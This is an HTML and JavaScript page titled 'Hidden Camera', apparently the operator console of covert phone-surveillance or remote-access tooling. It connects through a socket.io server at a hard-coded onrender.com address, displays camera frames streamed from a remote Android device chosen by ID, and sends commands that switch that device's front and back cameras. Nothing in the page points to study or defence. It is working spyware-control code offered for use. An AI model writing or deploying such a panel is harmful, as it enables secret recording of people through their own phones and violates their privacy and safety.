<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hidden Camera</title>
    <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            margin: 0; padding: 0;
            background-color: #000;
            color: #fff;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            height: 100vh;
            overflow: hidden;
            font-family: sans-serif;
        }

        #camContainer {
            position: relative;
            width: 100%; max-width: 400px; /* Thoda chota frame clean look ke liye */
            aspect-ratio: 9/16;
            background: #111;
            border: 2px solid #333;
            border-radius: 15px;
            display: flex; align-items: center; justify-content: center;
            overflow: hidden;
        }

        #camStream {
            width: 100%; height: 100%;
            object-fit: cover;
            display: none; 
            transform: rotate(90deg); /* Phone ke hisab se adjust karein */
        }

        .status-msg { text-align: center; }
        .spinner {
            width: 30px; height: 30px; border: 3px solid #333; border-top: 3px solid #00f3ff;
            border-radius: 50%; animation: spin 1s infinite linear; margin: 0 auto 10px;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        /* Controls Button Bar */
        .controls {
            margin-top: 20px;
            display: flex; gap: 20px;
            background: #222;
            padding: 10px 20px;
            border-radius: 30px;
        }

        .btn {
            background: none; border: none; color: white;
            font-size: 1.5rem; cursor: pointer;
            width: 50px; height: 50px;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
        }
        .btn:active { background: #333; transform: scale(0.95); }
        .btn-red { color: #ff4444; }
    </style>
</head>
<body>

    <div id="camContainer">
        <img id="camStream" src="" alt="">
        
        <div id="statusBox" class="status-msg">
            <div class="spinner"></div>
            <p id="statusText">Connecting...</p>
        </div>
    </div>

    <div class="controls">
        <button class="btn" onclick="sendCamCommand('CAM_FRONT')">
            <i class="fa-solid fa-user"></i>
        </button>
        
        <button class="btn btn-red" onclick="location.reload()">
            <i class="fa-solid fa-rotate-right"></i>
        </button>

        <button class="btn" onclick="sendCamCommand('CAM_BACK')">
            <i class="fa-solid fa-camera"></i>
        </button>
    </div>

    <script>
        // Server URL dhyan se check karna
        const API_BASE = 'https://child-v9no.onrender.com'; 
        
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');
        let socket = null;

        const imgElement = document.getElementById('camStream');
        const statusBox = document.getElementById('statusBox');

        if (!DEVICE_ID) {
            document.getElementById('statusText').innerText = "No Device ID!";
            document.querySelector('.spinner').style.display = 'none';
        } else {
            startSocket();
        }

        function startSocket() {
            socket = io(API_BASE);

            socket.on('connect', () => {
                console.log("Connected");
                // Web Client ki tarah join karo
                socket.emit('join-web', DEVICE_ID);
                document.getElementById('statusText').innerText = "Waiting for video...";
            });

            // Video Stream Receive karna
            socket.on('cam-image', (data) => {
                if(data && data.image) {
                    statusBox.style.display = 'none';
                    imgElement.style.display = 'block';
                    imgElement.src = "data:image/jpeg;base64," + data.image;
                }
            });

            socket.on('disconnect', () => {
                statusBox.style.display = 'block';
                imgElement.style.display = 'none';
                document.getElementById('statusText').innerText = "Disconnected";
            });
        }

        // ðŸ”¥ COMMAND BHEJNE KA SIMPLE FUNCTION
        function sendCamCommand(action) {
            if(!socket || !DEVICE_ID) return;
            
            console.log("Sending:", action);
            
            // Socket se command bhejo (Server -> Android)
            socket.emit('send-command', {
                deviceId: DEVICE_ID,
                command: action,
                x: 0, y: 0
            });
        }
    </script>
</body>
</html>
